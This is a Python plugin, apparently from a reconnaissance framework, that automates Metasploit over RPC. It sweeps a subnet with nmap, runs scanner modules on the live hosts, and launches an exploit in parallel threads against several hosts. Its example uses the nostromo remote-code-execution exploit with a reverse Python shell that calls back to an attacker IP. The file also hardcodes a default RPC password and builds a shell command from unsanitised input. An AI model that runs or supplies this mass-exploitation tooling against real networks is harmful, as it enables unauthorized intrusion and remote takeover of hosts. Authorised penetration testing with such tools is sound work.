"""

Interface for Metasploit

Pre Reqs:
- Metasploit console installed
- Metasploit RPC server running on localhost:55552
- msfrpcd -P password -S -a 


"""
import sys
import os
import matplotlib.pyplot as plt
# Add the project root (where main.py is) to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from plugin_manager import PluginBase
from common.common import plot

import networkx as nx
from pymetasploit3.msfrpc import MsfRpcClient
import time
import subprocess
import threading

class MetasploitAutomation(PluginBase):
    @staticmethod
    def class_types():
        return( [
                "ip",
                "netblock",
                "domain",
                "subdomain",
                "ip6"
                ])

    def __init__(self, msf_host='localhost', msf_port=55552, msf_user='msf', msf_pass='SsnUJdup'):
        # Initialize the Metasploit RPC client with the password
        self.client = MsfRpcClient(password=msf_pass, server=msf_host, port=msf_port, username=msf_user)
        self.graph = nx.DiGraph()  # Directed graph to represent relationships

    def scan_target(self, target_ip):
        """Perform a simple scan to gather information about the target."""
        print(f"Scanning target {target_ip}...")
        # Add a node for the target
        self.graph.add_node(target_ip, type='target', status='scanned')

        # Add basic scanning logic
        auxiliary_modules = [
            'scanner/portscan/tcp',
            'scanner/portscan/syn',
            'auxiliary/scanner/portscan/version',
            'auxiliary/scanner/http/http_version',
            'auxiliary/scanner/smb/smb_version',
            'auxiliary/scanner/ftp/ftp_version',
            'auxiliary/scanner/snmp/snmp_enum',
            'auxiliary/scanner/ssh/ssh_version',
            'auxiliary/scanner/mysql/mysql_version'
        ]  # Example modules

        for module_name in auxiliary_modules:
            try:
                print(f"Running service scan with {module_name}")
                service_scan = self.client.modules.use('auxiliary', module_name)
                service_scan['RHOSTS'] = target_ip

                # Check if the module requires additional options
                required_options = service_scan.missing_required
                if required_options:
                    print(f"Module {module_name} requires additional options: {required_options}")
                    continue

                job_id = service_scan.execute()
                time.sleep(5)  # Sleep for a moment to simulate scanning

                # Retrieve the results using the job ID
                result = self.client.jobs.info(job_id['job_id'])
                if 'error' in result:
                    print(f"Error in job {job_id['job_id']} for module {module_name}: {result['error_message']}")
                else:
                    self.graph.add_node(module_name, type='service', status='found')
                    self.graph.add_edge(target_ip, module_name, relationship='scanned_by')
                    print(f"Results for {target_ip}, {module_name}: {result}")
            except Exception as e:
                print(f"Error scanning service {module_name}: {e}")
                
    def exploit_target(self, target_ip, exploit_name, payload_name, lhost, lport):
        """Attempt to exploit the target using a specified exploit and payload."""
        print(f"Exploiting target {target_ip} with {exploit_name} using payload {payload_name}...")
        try:
            # Select exploit
            exploit = self.client.modules.use('exploit', exploit_name)
            exploit['RHOSTS'] = target_ip
            exploit['LHOST'] = lhost
            exploit['LPORT'] = lport
            exploit.execute(payload=payload_name)

            # Record exploit attempt in the graph
            self.graph.add_node(exploit_name, type='exploit', status='executed')
            self.graph.add_edge(target_ip, exploit_name, relationship='attempted_exploit')

            # Check for session after exploit
            if self.check_for_session():
                print(f"Exploit successful. Session established with {target_ip}.")
                self.graph.add_node(target_ip, status='compromised')
                self.graph.add_edge(exploit_name, target_ip, relationship='exploited_by')
            else:
                print("Exploit failed or no session established.")
        except Exception as e:
            print(f"Error exploiting target {target_ip}: {e}")

    def check_for_session(self):
        """Check if any sessions were created after an exploit attempt."""
        sessions = self.client.sessions.list
        return len(sessions) > 0

    def discover_valid_hosts(self, network_range):
        """Perform network discovery (ping sweep or port scan) to find valid hosts."""
        valid_hosts = []
        # Example: Using nmap to discover live hosts in a subnet
        print(f"Discovering hosts in range {network_range}...")
        nmap_command = f"nmap -sn {network_range}"
        try:
            result = subprocess.check_output(nmap_command, shell=True).decode('utf-8')
            # Parse the nmap result to get live hosts (IPs)
            for line in result.splitlines():
                if "Nmap scan report for" in line:
                    host = line.split()[-1]
                    valid_hosts.append(host)
                    self.graph.add_node(host, type='host', status='discovered')
                    print(f"Discovered valid host: {host}")
        except subprocess.CalledProcessError as e:
            print(f"Error discovering hosts: {e}")
        return valid_hosts

    def automate_scan_on_valid_hosts(self, network_range):
        """Automate scanning on valid discovered hosts."""
        valid_hosts = self.discover_valid_hosts(network_range)
        print(f"Automating scans on valid hosts: {valid_hosts}")
        for host in valid_hosts:
            # Run scan in a separate thread to speed up processing
            threading.Thread(target=self.scan_target, args=(host,)).start()

    def automate_exploit_on_valid_hosts(self, valid_hosts, exploit_name, payload_name, lhost, lport):
        """Automate exploiting on valid discovered hosts."""
        for host in valid_hosts:
            # Run exploit in a separate thread to speed up processing
            threading.Thread(target=self.exploit_target, args=(host, exploit_name, payload_name, lhost, lport)).start()

    def generate_report(self):
        """Generate and print a report from the networkx graph."""
        print("Generating network map report...")
        for node in self.graph.nodes:
            print(f"Node: {node}, Type: {self.graph.nodes[node]['type']}, Status: {self.graph.nodes[node].get('status', 'N/A')}")
        for edge in self.graph.edges:
            print(f"Edge from {edge[0]} to {edge[1]}, Relationship: {self.graph[edge[0]][edge[1]]['relationship']}")

    def save_graph(self, filename):
        """Save the graph to a file."""
        nx.write_gpickle(self.graph, filename)
        print(f"Graph saved to {filename}")

    def load_graph(self, filename):
        """Load the graph from a file."""
        self.graph = nx.read_gpickle(filename)
        print(f"Graph loaded from {filename}")

    def plot_graph(self):
        """Plot the graph using the plot function."""
        plot(self.graph)
        print("Graph plotted")

    def visualize_graph(self):
        """Visualize the graph using Matplotlib."""
        pos = nx.spring_layout(self.graph)
        plt.figure(figsize=(12, 8))
        nx.draw(self.graph, pos, with_labels=True, node_size=3000, node_color="skyblue", font_size=10, font_weight="bold", edge_color="gray")
        plt.title("Network Scan and Exploitation Graph")
        plt.show()

# Main Usage Example
if __name__ == "__main__":
    # Initialize the MetasploitAutomation class
    msf = MetasploitAutomation(msf_host='localhost', msf_port=55552, msf_user='msf')

    # Automate the discovery and scanning of hosts in a specific network range (e.g., 192.168.1.0/24)
    network_range = '192.168.1.0/24'  # Replace with your network range
    msf.automate_scan_on_valid_hosts(network_range)

    # After discovering valid hosts, attempt to exploit them
    valid_hosts = ['192.168.1.100', '192.168.1.101']  # Replace with actual valid hosts
    exploit_name = 'exploit/linux/http/nostromo_code_exec'
    payload_name = 'cmd/unix/reverse_python'
    lhost = '192.168.1.1'  # Attacker IP
    lport = 4444  # Port for reverse shell
    msf.automate_exploit_on_valid_hosts(valid_hosts, exploit_name, payload_name, lhost, lport)

    # Generate report
    msf.generate_report()

    # Save the graph
    msf.save_graph('metasploit_network_map.gpickle')

    # Plot the graph
    msf.plot_graph()

    # Visualize the graph
    msf.visualize_graph()